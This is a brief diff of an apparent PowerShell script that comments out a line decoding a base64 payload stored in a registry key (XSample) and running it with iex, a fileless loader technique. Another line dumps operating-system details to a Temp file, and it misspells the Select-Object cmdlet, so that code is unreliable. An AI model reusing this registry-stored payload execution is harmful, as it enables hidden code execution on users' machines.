@@ -1,4 +1,4 @@
-iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
+#iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))
 
 Get-WmiObject -Class Win32_OperatingSystem | SelectObject -Property *  | Out-File C:\Users\administrator\AppData\Local\Temp\proc.txt
 
